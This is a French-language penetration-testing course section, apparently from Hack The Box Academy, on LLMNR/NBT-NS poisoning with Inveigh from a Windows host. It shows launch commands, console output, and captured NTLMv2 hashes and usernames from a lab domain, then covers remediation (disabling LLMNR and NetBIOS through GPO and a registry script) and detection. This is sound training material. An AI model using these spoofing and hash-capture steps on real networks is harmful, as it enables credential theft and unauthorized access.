Intoxication LLMNR/NBT-NS - à partir de Windows
===============================================

* * * * *

L'empoisonnement LLMNR & NBT-NS est également possible à partir d'un hôte Windows. Dans la dernière section, nous avons utilisé Responder pour capturer les hachages. Cette section explore l'outil [Inveigh](https://github.com/Kevin-Robertson/Inveigh) et tente de capturer un autre ensemble d'informations d'identification.

* * * * *

Inveigh - Aperçu
----------------

Si nous nous retrouvons avec un hôte Windows comme notre boîte d'attaque, notre client nous fournit une boîte Windows à tester, ou nous atterrissons sur un hôte Windows en tant qu'administrateur local via une autre méthode d'attaque et aimerions chercher à approfondir notre accès, l'outil [Inveigh](https://github.com/Kevin-Robertson/Inveigh) fonctionne de manière similaire à Responder, mais est écrit en PowerShell et C#. Inveigh peut écouter IPv4 et IPv6 et plusieurs autres protocoles, notamment `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`, et Proxy Auth. L'outil est disponible dans le `C:\Tools`répertoire sur l'hôte d'attaque Windows fourni.

Nous pouvons commencer avec la version PowerShell comme suit, puis lister tous les paramètres possibles. Il existe un [wiki](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) qui répertorie tous les paramètres et les instructions d'utilisation.

Utiliser Inveigh
----------------

```
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters

Key                     Value
---                     -----
ADIDNSHostsIgnore       System.Management.Automation.ParameterMetadata
KerberosHostHeader      System.Management.Automation.ParameterMetadata
ProxyIgnore             System.Management.Automation.ParameterMetadata
PcapTCP                 System.Management.Automation.ParameterMetadata
PcapUDP                 System.Management.Automation.ParameterMetadata
SpooferHostsReply       System.Management.Automation.ParameterMetadata
SpooferHostsIgnore      System.Management.Automation.ParameterMetadata
SpooferIPsReply         System.Management.Automation.ParameterMetadata
SpooferIPsIgnore        System.Management.Automation.ParameterMetadata
WPADDirectHosts         System.Management.Automation.ParameterMetadata
WPADAuthIgnore          System.Management.Automation.ParameterMetadata
ConsoleQueueLimit       System.Management.Automation.ParameterMetadata
ConsoleStatus           System.Management.Automation.ParameterMetadata
ADIDNSThreshold         System.Management.Automation.ParameterMetadata
ADIDNSTTL               System.Management.Automation.ParameterMetadata
DNSTTL                  System.Management.Automation.ParameterMetadata
HTTPPort                System.Management.Automation.ParameterMetadata
HTTPSPort               System.Management.Automation.ParameterMetadata
KerberosCount           System.Management.Automation.ParameterMetadata
LLMNRTTL                System.Management.Automation.ParameterMetadata

<SNIP>

```

Commençons Inveigh avec l'usurpation LLMNR et NBNS, et sortons vers la console et écrivons dans un fichier. Nous laisserons le reste des valeurs par défaut, que vous pouvez voir [ici](https://github.com/Kevin-Robertson/Inveigh#parameter-help) .

```
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

[*] Inveigh 1.506 started at 2022-02-28T19:26:30
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.5.25
[+] Spoofer IP Address = 172.16.5.25
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer For Types 00,20 = Enabled
[+] NBNS TTL = 165 Seconds
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Certificate Issuer = Inveigh
[+] HTTPS Certificate CN = localhost
[+] HTTPS Capture = Enabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Enabled
[+] Output Directory = C:\Tools
WARNING: [!] Run Stop-Inveigh to stop
[*] Press any key to stop console output
WARNING: [-] [2022-02-28T19:26:31] Error starting HTTP listener
WARNING: [!] [2022-02-28T19:26:31] Exception calling "Start" with "0" argument(s): "An attempt was made to access a
socket in a way forbidden by its access permissions" $HTTP_listener.Start()
[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:31] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:33] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:34] TCP(445) SYN packet detected from 172.16.5.125:56834
[+] [2022-02-28T19:26:34] SMB(445) negotiation request detected from 172.16.5.125:56834
[+] [2022-02-28T19:26:34] SMB(445) NTLM challenge 7E3B0E53ADB4AE51 sent to 172.16.5.125:56834

<SNIP>

```

Nous pouvons voir que nous commençons immédiatement à recevoir des requêtes LLMNR et mDNS. L'animation ci-dessous montre l'outil en action.

![image](https://academy.hackthebox.com/storage/modules/143/inveigh_pwsh.png)

* * * * *

C# Inveigh (InveighZero)
------------------------

La version PowerShell d'Inveigh est la version originale et n'est plus mise à jour. L'auteur de l'outil maintient la version C#, qui combine le code PoC C# d'origine et un port C# de la plupart du code de la version PowerShell. Avant de pouvoir utiliser la version C# de l'outil, nous devons compiler l'exécutable. Pour gagner du temps, nous avons inclus une copie de la version exécutable PowerShell et compilée de l'outil dans le `C:\Tools`dossier sur l'hôte cible dans le laboratoire, mais cela vaut la peine de parcourir l'exercice (et la meilleure pratique) de le compiler vous-même à l'aide de Visual Studio.

Allons-y et exécutons la version C # avec les valeurs par défaut et commençons à capturer les hachages.

```
PS C:\htb> .\Inveigh.exe

[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Tools]
[+] Previous Session Files (Not Found)
[*] Press ESC to enter/exit interactive console
[!] Failed to start HTTP listener on port 80, check IP and port usage.
[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.
[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[+] [20:03:32] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[+] [20:03:32] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
[-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]

```

Comme nous pouvons le voir, l'outil démarre et montre quelles options sont activées par défaut et lesquelles ne le sont pas. Les options avec un `[+]`sont par défaut et activées par défaut et celles avec un `[ ]`avant sont désactivées. La sortie de la console en cours d'exécution nous montre également quelles options sont désactivées et, par conséquent, les réponses ne sont pas envoyées (mDNS dans l'exemple ci-dessus). Nous pouvons également voir le message `Press ESC to enter/exit interactive console`, qui est très utile lors de l'exécution de l'outil. La console nous donne accès aux identifiants/hachages capturés, nous permet d'arrêter Inveigh, et plus encore.

Nous pouvons appuyer sur la `esc`touche pour entrer dans la console pendant qu'Inveigh est en cours d'exécution.

```

<SNIP>

[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61310
[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61311
C(0:0) NTLMv1(0:0) NTLMv2(3:9)> HELP

```

Après avoir tapé `HELP`et appuyé sur Entrée, plusieurs options s'offrent à nous :

```

=============================================== Inveigh Console Commands ===============================================

Command                           Description
========================================================================================================================
GET CONSOLE                     | get queued console output
GET DHCPv6Leases                | get DHCPv6 assigned IPv6 addresses
GET LOG                         | get log entries; add search string to filter results
GET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter results
GET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter results
GET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter results
GET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter results
GET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashes
GET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashes
GET CLEARTEXT                   | get captured cleartext credentials
GET CLEARTEXTUNIQUE             | get unique captured cleartext credentials
GET REPLYTODOMAINS              | get ReplyToDomains parameter startup values
GET REPLYTOHOSTS                | get ReplyToHosts parameter startup values
GET REPLYTOIPS                  | get ReplyToIPs parameter startup values
GET REPLYTOMACS                 | get ReplyToMACs parameter startup values
GET IGNOREDOMAINS               | get IgnoreDomains parameter startup values
GET IGNOREHOSTS                 | get IgnoreHosts parameter startup values
GET IGNOREIPS                   | get IgnoreIPs parameter startup values
GET IGNOREMACS                  | get IgnoreMACs parameter startup values
SET CONSOLE                     | set Console parameter value
HISTORY                         | get command history
RESUME                          | resume real time console output
STOP                            | stop Inveigh

```

Nous pouvons rapidement afficher les hachages capturés uniques en tapant `GET NTLMV2UNIQUE`.

```

================================================= Unique NTLMv2 Hashes =================================================

Hashes
========================================================================================================================
backupagent::INLANEFREIGHT:B5013246091943D7:16A41B703C8D4F8F6AF75C47C3B50CB5:01010000000000001DBF1816222DD801DF80FE7D54E898EF0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008001DBF1816222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
forend::INLANEFREIGHT:32FD89BD78804B04:DFEB0C724F3ECE90E42BAF061B78BFE2:010100000000000016010623222DD801B9083B0DCEE1D9520000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080016010623222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000

<SNIP>

```

Nous pouvons saisir `GET NTLMV2USERNAMES`et voir quels noms d'utilisateur nous avons collectés. Ceci est utile si nous voulons une liste d'utilisateurs pour effectuer une énumération supplémentaire et voir ceux qui valent la peine d'essayer de se fissurer hors ligne en utilisant Hashcat.

```

=================================================== NTLMv2 Usernames ===================================================

IP Address                        Host                              Username                          Challenge
========================================================================================================================
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\backupagent       | B5013246091943D7
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\forend            | 32FD89BD78804B04
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\clusteragent      | 28BF08D82FA998E4
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\wley              | 277AC2ED022DB4F7
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\svc_qualys        | 5F9BB670D23F23ED

```

Commençons Inveigh puis interagissons un peu avec la sortie pour tout assembler.

![image](https://academy.hackthebox.com/storage/modules/143/inveigh_csharp.png)

* * * * *

Remédiation
-----------

Mitre ATT&CK répertorie cette technique sous [ID : T1557.001](https://attack.mitre.org/techniques/T1557/001) , `Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay`.

Il existe plusieurs façons d'atténuer cette attaque. Pour nous assurer que ces attaques par usurpation ne sont pas possibles, nous pouvons désactiver LLMNR et NBT-NS. En guise de mise en garde, il vaut toujours la peine de tester lentement un changement important comme celui-ci dans votre environnement avant de le déployer complètement. En tant que testeurs d'intrusion, nous pouvons recommander ces étapes de correction, mais nous devons clairement indiquer à nos clients qu'ils doivent tester ces modifications de manière approfondie pour s'assurer que la désactivation des deux protocoles ne casse rien sur le réseau.

Nous pouvons désactiver LLMNR dans la stratégie de groupe en accédant à Configuration ordinateur -> Modèles d'administration -> Réseau -> Client DNS et en activant "Désactiver la résolution de nom multidiffusion".

![image](https://academy.hackthebox.com/storage/modules/143/llmnr_disable.png)

NBT-NS ne peut pas être désactivé via la stratégie de groupe mais doit être désactivé localement sur chaque hôte. Nous pouvons le faire en ouvrant `Network and Sharing Center`sous `Control Panel`, en cliquant sur `Change adapter settings`, en cliquant avec le bouton droit sur l'adaptateur pour afficher ses propriétés, en sélectionnant `Internet Protocol Version 4 (TCP/IPv4)`et en cliquant sur le `Properties`bouton, puis en cliquant sur `Advanced`et en sélectionnant l' `WINS`onglet et enfin en sélectionnant `Disable NetBIOS over TCP/IP`.

![image](https://academy.hackthebox.com/storage/modules/143/disable_nbtns.png)

Bien qu'il ne soit pas possible de désactiver NBT-NS directement via GPO, nous pouvons créer un script PowerShell sous Configuration ordinateur --> Paramètres Windows --> Script (Démarrage/Arrêt) --> Démarrage avec quelque chose comme ceci :

Code : powershell

```

$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}

```

Dans l'éditeur de stratégie de groupe local, nous devrons double-cliquer sur `Startup`, choisir l' `PowerShell Scripts`onglet et sélectionner "Pour cet objet de stratégie de groupe, exécuter les scripts dans l'ordre suivant" à `Run Windows PowerShell scripts first`, puis cliquer sur `Add`et choisir le script. Pour que ces modifications se produisent, nous devions soit redémarrer le système cible, soit redémarrer la carte réseau.

![image](https://academy.hackthebox.com/storage/modules/143/nbtns_gpo.png)

Pour envoyer cela à tous les hôtes d'un domaine, nous pourrions créer un GPO en utilisant `Group Policy Management`le contrôleur de domaine et héberger le script sur le partage SYSVOL dans le dossier des scripts, puis l'appeler via son chemin UNC, par exemple :

`\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts`

Une fois que le GPO est appliqué à des unités d'organisation spécifiques et que ces hôtes sont redémarrés, le script s'exécutera au prochain redémarrage et désactivera NBT-NS, à condition que le script existe toujours sur le partage SYSVOL et soit accessible par l'hôte sur le réseau.

![image](https://academy.hackthebox.com/storage/modules/143/nbtns_gpo_dc.png)

D'autres atténuations incluent le filtrage du trafic réseau pour bloquer le trafic LLMNR/NetBIOS et l'activation de la signature SMB pour empêcher les attaques de relais NTLM. Les systèmes de détection et de prévention des intrusions sur le réseau peuvent également être utilisés pour atténuer cette activité, tandis que la segmentation du réseau peut être utilisée pour isoler les hôtes qui nécessitent l'activation de LLMNR ou NetBIOS pour fonctionner correctement.

* * * * *

Détection
---------

Il n'est pas toujours possible de désactiver LLMNR et NetBIOS, et nous avons donc besoin de moyens pour détecter ce type de comportement d'attaque. Une façon consiste à utiliser l'attaque contre les attaquants en injectant des demandes LLMNR et NBT-NS pour des hôtes inexistants sur différents sous-réseaux et en alertant si l'une des réponses reçoit des réponses qui indiqueraient qu'un attaquant usurpe les réponses de résolution de nom. Ce [billet de blog](https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/) explique cette méthode plus en profondeur.

De plus, les hôtes peuvent être surveillés pour le trafic sur les ports UDP 5355 et 137, et les ID d'événement [4697](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4697) et [7045](https://www.manageengine.com/products/active-directory-audit/kb/system-events/event-id-7045.html) peuvent être surveillés. Enfin, nous pouvons surveiller la clé de registre `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient`pour les modifications apportées à la `EnableMulticast`valeur DWORD. Une valeur de `0`signifierait que LLMNR est désactivé.

* * * * *

Passer à autre chose
--------------------

Nous avons maintenant capturé les hachages pour plusieurs comptes. À ce stade de notre évaluation, nous voudrions effectuer une énumération à l'aide d'un outil tel que BloodHound pour déterminer si l'un ou l'ensemble de ces hachages valent la peine d'être déchiffrés. Si nous avons de la chance et déchiffrons un hachage pour un compte d'utilisateur avec un accès ou des droits privilégiés, nous pouvons commencer à étendre notre portée dans le domaine. Nous pouvons même avoir beaucoup de chance et déchiffrer le hachage pour un utilisateur administrateur de domaine ! Si nous n'avons pas eu de chance en cassant des hachages ou en avons craqué certains mais n'avons pas donné de fruits, alors peut-être que la pulvérisation de mot de passe (que nous couvrirons en profondeur dans les quelques sections suivantes) aura plus de succès.

Serveurs VPN
